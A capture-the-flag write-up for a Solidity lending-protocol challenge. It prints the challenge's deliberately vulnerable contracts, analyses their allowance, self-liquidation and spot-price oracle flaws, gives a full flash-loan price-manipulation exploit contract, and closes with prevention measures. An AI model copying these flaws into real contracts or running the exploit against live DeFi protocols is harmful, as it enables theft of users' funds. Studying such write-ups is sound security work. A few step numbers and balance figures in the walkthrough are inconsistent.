- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
      - [1.1.1 Token Contract](#111-token-contract)
      - [1.1.2 FlashLoan Contract](#112-flashloan-contract)
      - [1.1.3 Setup Contract](#113-setup-contract)
    - [1.2 Lender.sol](#12-lendersol)
      - [1.2.1 IUniswapV2Pair Interface](#121-iuniswapv2pair-interface)
      - [1.2.2 ERC20Like Interface](#122-erc20like-interface)
      - [1.2.3 Lender Contract](#123-lender-contract)
  - [2. Vulnerability Analysis](#2-vulnerability-analysis)
    - [2.1 Incorrect Allowance Check](#21-incorrect-allowance-check)
    - [2.2 Flawed Liquidation Logic](#22-flawed-liquidation-logic)
    - [2.3 Price Manipulation via Oracle Dependence](#23-price-manipulation-via-oracle-dependence)
    - [2.4 Attack Chain](#24-attack-chain)
  - [3. Exploitation](#3-exploitation)
    - [3.1 Attack Strategy](#31-attack-strategy)
    - [3.2 Implementation of Exploit Contract](#32-implementation-of-exploit-contract)
  - [4. Prevention Measures](#4-prevention-measures)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides two source code files including `Lender.sol` and `Setup.sol`.

### 1.1 Setup.sol
The `Setup.sol` contains three contracts: Token, FlashLoan, and Setup.

#### 1.1.1 Token Contract
```solidity
contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public dropped;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1_000_000 ether;
    
    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(address to, uint256 amount) public returns (bool) {
        allowance[msg.sender][to] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function getBalanceOf(address who) external view returns (uint){
        return balanceOf[who];
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (from != msg.sender) {
            allowance[from][to] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
```
The Token Contract is a custom token contract that implements balances, allowances, and basic transfer/transferFrom/approve functions.

It contains the following state variables:
- `balanceOf`: tracks token balances for each address
- `dropped`: declared but never used in the contract
- `allowance`: implements token spending approvals with a nested mapping structure: `owner -> spender -> amount`
- `totalSupply`: stores the total number of tokens created, which is 1,000,000 ether

Core functions include:
- `approve(to, amount)`: lets the caller (owner) set how many tokens `to` (the spender) is allowed to move from the caller's balance
- `transfer(to, amount)`: transfers token from caller to recipient by internally calling `transferFrom` for implementation
- `transferFrom(from, to, amount)`: Core transfer logic handling **(vulnerable!)**

#### 1.1.2 FlashLoan Contract
```sol
contract FlashLoan {

    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor() payable{
        require(msg.value == 1000 ether);
        weth.deposit{value : msg.value}();
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = weth.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        weth.transfer(msg.sender, amount);

        (bool success,) = msg.sender.call(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );
        require(success, "External call failed");

        require(weth.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}
```

The FlashLoan contract implements a basic flash loan mechanism. Flash loans allow users to borrow large amounts of assets without collateral, but must repay in the same transaction. In another word, the borrowed amount is returned within the same transaction.
> The smart contract ensures that by checking its own balance after the callback (`receiveFlashLoan`) is at least the same as before. If not, the transaction reverts entirely, meaning the loan never really happens on-chain.

It contains a hardcoded reference to a WETH9 contract, initializes the contract with 1000 ETH and converts the deposited ETH to WETH tokens.
> WETH (Wrapped Ether): an ERC-20 token representation of native Ethereum (ETH). Since native ETH doesn't conform to the ERC-20 standard, lacking standard functions like `transferFrom()` and `approve()`, ETH cannot directly interact with complex DeFi applications, most of which are built for ERC-20 tokens. Therefore, WETH serves as a bridge between native ETH and the ERC-20 token standard.

The core function is `flashLoan(amount)`:
- validates the requested loan amount is not greater than what the FlashLoan Contract owns (1000 WETH)
- sends `amount` WETH tokens to the borrower (`msg.sender`)
- executes a callback into the borrower's contract (must return the WETH by the time this function finishes)
- checks if the borrower's callback function executes successfully

#### 1.1.3 Setup Contract
```sol
contract Setup {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    Token public token;
    IUniswapV2Pair public pair;
    Lender public lender;
    FlashLoan public flashloanPool;

    uint256 constant DECIMALS = 1 ether;
    uint256 totalBefore;

    constructor() payable {
        require(msg.value == 1050 ether);
        weth.deposit{value : 50 ether}();
        
        token = new Token();
        pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
        lender = new Lender(pair, ERC20Like(address(token)));
        token.transfer(address(lender), 500_000 * DECIMALS);

        weth.transfer(address(pair), 25 ether);
        token.transfer(address(pair), 500_000 * DECIMALS);
        pair.mint(address(this));

        weth.approve(address(lender), type(uint256).max);
        lender.deposit(25 ether);
        lender.borrow(200_000 * DECIMALS);

        totalBefore = weth.balanceOf(address(lender)) + token.balanceOf(address(lender)) / lender.rate();

        flashloanPool = (new FlashLoan){value : 1000 ether}();
    }

    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(lender)) < 2 ether;
    }
}
```

The Setup Contract initializes the DeFi environment:
1. Funding: receives 1050 ETH, converts 50 ETH to WETH
2. Token Deployment: deploys the custom Token contract with 1,000,000 tokens
3. Uniswap Pair: creates WETH/Token trading pair
4. Lender Deployment: deploys Lender Contract and transfers 500,000 tokens to it
5. Liquidity Pool Initialization: adds liquidity (25 WETH + 500,000 tokens) to create initial price ratio (1 WETH = 20,000 tokens, or 1 token = 0.00005 WETH)
6. Sample Borrowing: deposits 25 WETH as collateral and borrows 200,000 tokens
7. Flash Loan Pool: deploys FlashLoan contract with 1000 WETH available for flash loans


**Win Condition**: The challenge is solved when `weth.balanceOf(address(lender)) < 2 ether`, meaning the Lender contract must be drained from 25 WETH down to less than 2 WETH.

### 1.2 Lender.sol
The `Lender.sol` contains two interfaces and the Lender Contract.

#### 1.2.1 IUniswapV2Pair Interface
```sol
interface IUniswapV2Pair {
    function mint(address to) external returns (uint liquidity);
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}
```

This interface defines key functions needed to interact with a Uniswap V2 liquidity pool. It is used to provide liquidity, query pool reserves, execute trades, and identify token ordering.
> Uniswap V2: a decentralized exchange protocol that uses an automated market maker (AMM) model with the constant product formula: `x * y = k` where `x` = reserve of token0, `y` = reserve of token1, and `k` is a constant product.

#### 1.2.2 ERC20Like Interface
```sol
interface ERC20Like {
    function transfer(address dst, uint qty) external returns (bool);
    function transferFrom(address src, address dst, uint qty) external returns (bool);
    function approve(address dst, uint qty) external returns (bool);
    function balanceOf(address who) external view returns (uint);
}

interface WETH9 is ERC20Like {
    function deposit() external payable;
}
```
This interface defines the standard ERC-20 functions (`transfer`, `transferFrom`, `approve`, `balanceOf`) that allow the Lender contract to interact generically with both the custom Token and WETH. 
> ERC20 (Ethereum Request for Comments 20): is a technical standard that defines a common set of rules and interfaces for creating and managing tokens.

#### 1.2.3 Lender Contract
```sol
contract Lender {
    IUniswapV2Pair public pair;
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20Like public token;

    mapping(address => uint256) public deposited;
    mapping(address => uint256) public debt;

    constructor (IUniswapV2Pair _pair, ERC20Like _token) {
        pair = _pair;
        token = _token;
    }

    function rate() public view returns (uint256) {
        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
        if (pair.token0() == address(weth)){
            uint256 _rate = uint256(_reserve1 / _reserve0);
            return _rate;
        }
        uint256 _rate = uint256(_reserve0 / _reserve1);
        return _rate;
    }

    function safeDebt(address user) public view returns (uint256) {
        return deposited[user] * rate() * 2 / 3;
    }

    function borrow(uint256 amount) public {
        debt[msg.sender] += amount;
        require(safeDebt(msg.sender) >= debt[msg.sender], "err: undercollateralized");
        token.transfer(msg.sender, amount);
    }

    function repay(uint256 amount) public {
        debt[msg.sender] -= amount;
        token.transferFrom(msg.sender, address(this), amount);
    }

    function liquidate(uint256 amount) public returns (uint256) {
        require(safeDebt(msg.sender) <= debt[msg.sender], "err: overcollateralized");
        debt[msg.sender] -= amount;
        token.transferFrom(msg.sender, address(this), amount);
        uint256 collateralValueRepaid = amount / rate();
        weth.transfer(msg.sender, collateralValueRepaid);
        return collateralValueRepaid;
    }

    function deposit(uint256 amount) public {
        deposited[msg.sender] += amount;
        weth.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) public {
        deposited[msg.sender] -= amount;
        require(safeDebt(msg.sender) >= debt[msg.sender], "err: undercollateralized");
        weth.transfer(msg.sender, amount);
    }
}
```

The Lender Contract implements a collateralized lending protocol where users can:
1. deposit WETH as collateral
2. Borrow tokens against their collateral
3. Repay borrowed tokens
4. Liguidate undercollateralized positions
5. Withdraw collateral when sufficiently collateralized

It contains the following state variables:
- `pair`: Uniswap V2 pair for price oracle
- `weth`: WETH9 token contract
- `token`: borrowable token
- `deposit`: tracks WETH collateral deposited by each user
- `debt`: tacks token debt owed by each user
  
Core functions include:
- `rate()`: price oracle that calculates the exchange rate between WETH and tokens by reading reserves from the Uniswap pair, returning how many tokens equal 1 WETH **(vulnerable!)**
  - Initially: 500,000 tokens / 25 WETH = 20,000 tokens per WETH
- `safeDebt(user)`: calculates maximum safe borrowing limit
  - maximum borrowable amount = collateral value x price x 2/3
-  `borrow(amount)`: allows users to borrow tokens against their WETH collateral
   -  Increase user's debt
   -  check collateralization ratio (must remain under 66.67%)
   -  transfer token to borrower
- `liquidate(amount)`: allows liquidating undercollateralized positions **(vulnerable!)**
  - the function incorrectly checks `msg.sender`'s (liquidator's) debt position instead of the `target` user's position

## 2. Vulnerability Analysis
This challenge contains multiple vulnerabilities that can be chained together to drain the Lender contract.

### 2.1 Incorrect Allowance Check
The vulnerability exists in `Token.transferFrom()` function:
```sol
if (from != msg.sender) {
    allowance[from][to] -= amount;
}
```
The function checks `allowance[from][to]` instead of the correct `allowance[from][msg.sender]`. In another word, allowance should be checked as `allowance[owner][spender]` instead of `allowance[owner][recipient]`. 

This means that allowance is checked/deducted from the wrong mapping entry, allowing bypassing allowance checks when `to` address has any allowance from `from`.

### 2.2 Flawed Liquidation Logic
The vulnerability exists in the `Lender.liquidate()` function:
```sol
function liquidate(uint256 amount) public returns (uint256) {
    require(safeDebt(msg.sender) <= debt[msg.sender], "err: overcollateralized");
    debt[msg.sender] -= amount;
    token.transferFrom(msg.sender, address(this), amount);
    uint256 collateralValueRepaid = amount / rate();
    weth.transfer(msg.sender, collateralValueRepaid);
    return collateralValueRepaid;
}
```

The function validates wether the liquidator (`msg.sender`) is undercollateralized instead of the `target` being liquidated. In another word, the liquidation should be `safeDebt(target) <= debt[target]` instead of `safeDebt(msg.sender) <= debt[msg.sender]`.

It implements self-liquidation instead of third-party liquidation.

A normal liquidation logic is shown as follows:
- Should allow bob to liquidate Alice's undercollateralized position
- Bob pays back Alice's debt and receives Alice's collateral + liquidation bonus

However, the flawed liquidation logic is shown as follows:
- Only checks users to liquidate their own positions, ensuring the caller is undercollateralized
- The caller repays their own debt and withdraw their own collateral

It is dangerous because:
1. the attacker can intentionally create an undercollateralized position
2. manipulate `rate()` to be much lower than when debt was borrowed
3. self-liquidate: repay debt at the new rate
4. extract more WETH than originally deposited

### 2.3 Price Manipulation via Oracle Dependence
The vulnerability exists in the `Lender.rate()` function:
```sol
function rate() public view returns (uint256) {
    (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
    if (pair.token0() == address(weth)){
        uint256 _rate = uint256(_reserve1 / _reserve0);
        return _rate;
    }
    uint256 _rate = uint256(_reserve0 / _reserve1);
    return _rate;
}
```

The function relies on instantaneous Uniswap pool reserves which are suscepitble to manipulation through (rate = token reserves / WETH reserves):
- flash loan attacks
- large trades temporarily altering reserve ratios
- lack of time-weighted average price (TWAP) protection

### 2.4 Attack Chain
**Normal Operations** are shown as below:
1. User deposits WETH as collateral
2. System calculates maximum borrowable amount based on current price
3. User borrows tokens (`safeDebt()` check)
4. User repays debt to unlock collateral
5. User withdraws excess collateral

However, the vulnerabilities above create a powerful **attack chain**:
1. Use flash loan to get massive WETH
2. Price manipulation (Vuln 2.3)
   - Swap WETH -> Tokens in Uniswap pair
   - this increases WETH reserves and decreases token reserves
   - `rate()` becomes artificially low (fewer tokens per WETH)
3. Self-liquidate (Vuln 2.2)
   - now undercollateralized due to price change
     - `safeDebt(address(this))` decreases (collateral worth fewer tokens)
     - Condition: `safeDebt(msg.sender) <= debt[msg.sender]` becomes true
   - Call `liquidate()` to repay the token debt and receive WETH collateral
     -  `collateralValueRepaid = amount / rate()`
     -  Since `rate()` is artificially low, the division yields a large WETH amount
4. Reverse price manipulation
   - swap tokens -> WETH
   - restore original price
5. Repay flash loan
6. Profit = extracted WETH - original deposit

## 3. Exploitation
### 3.1 Attack Strategy
**Given Information**
1. Private Key (attacker's account)
2. Setup Address (entry point contract)
3. RPC URL (blockchain node endpoint)

**Attack Flow**
1. Deploy Exploit Contract with `receiveFlashLoan()` callback to handle flash loan logic
2. Request flash loan to borrow 1000 WETH from FlashLoan Contract
3. `receiveFlashLoan()` callback begins
   - Deposit collateral (25 WETH)
   - Borrow tokens (250,000 tokens)
   - Price manipulation (swap WETH -> tokens)
   - Self-liquidate at manipulated rate
   - Restore price (swap tokens -> WETH)
   - Repay flash loan
   - Profit = extracted WETH - costs

### 3.2 Implementation of Exploit Contract
The complete Exploit contract is shown as follows:
```sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Lender.sol";
import "./Setup.sol";

contract exploit{
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
      
    IUniswapV2Pair pair;
    FlashLoan faddress;
    Lender lender;
    Token  token;
    address owner;
      
    constructor(FlashLoan _faddress, Lender _lender, IUniswapV2Pair _pair, Token _token){
        faddress = _faddress;
        pair = _pair;
        lender = _lender;
        token = _token;
        owner = msg.sender;
    }

    function action() public {
        faddress.flashLoan(weth.balanceOf(address(faddress)));
    }

    function receiveFlashLoan(uint256 amount)  public {
        // 1. Deposit collateral
        weth.approve(address(lender), 25 * 1 ether);
        lender.deposit(25 * 1 ether); 
        
        // 2. Borrow tokens
        lender.borrow(250_000 * 1 ether);
       
        // 3. Price manipulation: Swap WETH -> Token to lower rate()
        weth.transfer(address(pair), 25 * 1 ether);
        pair.swap(249_000 * 1 ether, 0, address(this), '');
        
        // 4. Self-liquidate
        token.approve(address(lender), 250_000 * 1 ether);
        lender.liquidate(250_000 * 1 ether); 
        
        // 5. Restore price: Swap Token -> WETH
        token.transfer(address(pair), 249_000 * 1 ether);
        pair.swap(0, 24 * 1 ether, address(this), '');
        
        // 6. Repay flash loan
        weth.transfer(address(faddress), amount);
        
        // 7. Transfer profit to owner
        weth.transfer(owner, weth.balanceOf(address(this)));
    }
}
```

**Step 1: Initial State Analysis**
After Setup Contract's initialization, the state is shown below:
| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 25    | 300,000   | 500,000 initial - 200,000 lent to Setup |
| Uniswap Pair | 25 | 500,000   | Liquidity pool |
| FlashLoan | 1000  | 0         | Available for borrowing |

The current rate is: 500,000 / 25 = 20,000 tokens per WETH.

**Step 1: Deploy Exploit Contract**
The exploit contract needs references to the addresses of FlashLoan, Lender, Uniswap pair, and Token.

**Step 2: Trigger Flash Loan**
Call `action()` to request the maximum available WETH.
```sol
function action() public {
    faddress.flashLoan(weth.balanceOf(address(faddress)));
}
```
It triggers the FlashLoan Contract to send 1000 WETH to Exploit Contract, call `receiveFlashLoan()` on Exploit Contract, and expect repayment by the end of the transaction.
| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 25    | 300,000   | No change |
| Uniswap Pair | 25 | 500,000   | No change |
| FlashLoan | 0     | 0         | -1000 ETH (lent out) |
| Exploit   | 1000  | 0         | +1000 ETH (borrowed) |

**Step 3: Create Exploitable Position**
Inside `receiveFlashLoan()`:
```sol
// Deposit 25 WETH as collateral
weth.approve(address(lender), 25 * 1 ether);
lender.deposit(25 * 1 ether);

// Borrow 250,000 tokens (within safe debt limit)
lender.borrow(250_000 * 1 ether);
```
Current state:
- collateral: 25 WETH
- rate: 20,000 tokens/WETH
- safe debt limit: 25 * 20,000 * 2/3 = 333,333 tokens
- borrowing: 250,000 tokens (within limit)

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 50    | 50,000    | +25 WETH (from Exploit collateral), -250,000 tokens (lent out) |
| Uniswap Pair | 25 | 500,000   | No change |
| FlashLoan | 0     | 0         | No change |
| Exploit   | 975   | 250,000   | -25 WETH (collateral), +250,000 tokens (borrowed) |

**Step 4: Price Manipulation - Add WETH to Pair**
```sol
// Add WETH to Uniswap pair
weth.transfer(address(pair), 25 * 1 ether);
```

The pair reserves updated but rate remains unchanged until swap.

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 50    | 50,000    | No change |
| Uniswap Pair | 50 | 500,000   | +50 WETH (from exploit) |
| FlashLoan | 0     | 0         | No change |
| Exploit   | 950   | 250,000   | -25 WETH  |

**Step 5: Price Manipulation - Swap WETH -> Tokens**
```sol
pair.swap(249_000 * 1 ether, 0, address(this), '');
```

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 50    | 50,000    | No change |
| Uniswap Pair | 50 | 251,000   | -249,000 tokens (swapped out) |
| FlashLoan | 0     | 0         | No change |
| Exploit   | 950   | 499,000   | +249,000 tokens  |

The current rate is updated: `251,000 / 50 = 5,020` tokens per WETH.

Now that the exploit's position is undercollateralized:
- safe debt limit with new rate: 25 * 5,020 * 2/3 = 83666 tokens
- current debt: 250,000 tokens
- `safeDebt(Exploit) = 83,666 < debt(Exploit) = 250,000` => can liquidate

**Step 6: Self Liquidation**
```sol
token.approve(address(lender), 250_000 * 1 ether);
lender.liquidate(250_000 * 1 ether);
```

Inside `liquidate()` calculation, the value repaid is:
250,000 / rate = 250,000 / 5,020 ≈ 49.8 WETH

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 0.2   | 300,000   | -49.8 WETH (liquidate to Exploit), +250,000 tokens (repaid) |
| Uniswap Pair | 50 | 251,000   | No change |
| FlashLoan | 0     | 0         | No change |
| Exploit   | 999.8 | 249,000   | +49.8 WETH (liquidate from Lender), -250,000 tokens (repaid)|

**Step 7: Restore Price**
```sol
token.transfer(address(pair), 249_000 * 1 ether);
pair.swap(0, 25 * 1 ether, address(this), '');
```

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 0.2   | 300,000   | No change |
| Uniswap Pair | 25 | 500,000   | +249,000 tokens (from Exploit), -25 WETH (swapped out)|
| FlashLoan | 0     | 0         | No change |
| Exploit   | 1024.8| 0         | -249,000 tokens, +25 WETH |

The current rate is restored: `500,000 / 25 = 20,000` tokens per WETH.

**Step 8: Repay Flash Loan & Extract Profit**
```sol
weth.transfer(address(faddress), amount);
weth.transfer(owner, weth.balanceOf(address(this)));
```

| Contract  | WETH  | Token     | Notes |
| ---       | ---   | ---       | ---   |
| Lender    | 0.2   | 300,000   | No change |
| Uniswap Pair | 25 | 500,000   | No change |
| FlashLoan | 1000  | 0         | +1000 WETH (repaid) |
| Exploit   | 0     | 0         | -1000 WETH (repaid), -24.8 WETH (profit to owner) |
| Owner (EOA)| 24.8 | 0         | +24.8 ETH (profit) |

**Result**
The win condition is met:
- Lender WETH balance: 0.2 ETH < 2ETH
- `isSolved() = true`

## 4. Prevention Measures
This attack requires combining multiple vulnerabilities:
- price oracle manipulation (Uniswap spot price)
- Flawed liquidation logic (self-liquidation)
- No access control on liquidation

The prevention measures are listed as follows:
| Vulnerability | Root Cause | Solution |
| ---           | ---        | ---      |
| Self liquidation | Wrong address checked in `liquidate()` | check target's position |
| Price manipulation | Spot price oracle vulnerable to flash loans | implement TWAP (Time-Weighted Average Price) |
| Allowance bypass | Wrong mapping key in `transferFrom()` | check `allowance[from][msg.sender]` |

> TWAP (Time-Weighted Average Price): a trading algorithm that calculates the average price over a specified time period to minimize market impact.